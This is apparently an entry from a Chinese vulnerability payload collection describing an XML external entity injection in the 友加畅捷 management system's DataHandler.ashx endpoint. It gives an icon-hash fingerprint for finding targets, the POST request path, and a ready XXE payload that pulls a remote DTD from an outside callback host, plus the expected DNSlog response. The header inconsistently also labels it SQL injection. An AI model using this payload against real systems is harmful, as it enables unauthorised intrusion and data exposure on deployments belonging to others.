# 友加畅捷管理系统DataHandler.ashx存在XML实体注入漏洞

友加畅捷管理系统 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="2049187099"`
- **请求**：`POST /Report/DataHandler.ashx?Type=SaveData HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://vpkkxjxrkl.zaza.eu.org/1.dtd">
%remote;]>
<root/>
```
- **响应特征**：200 Dnslog回显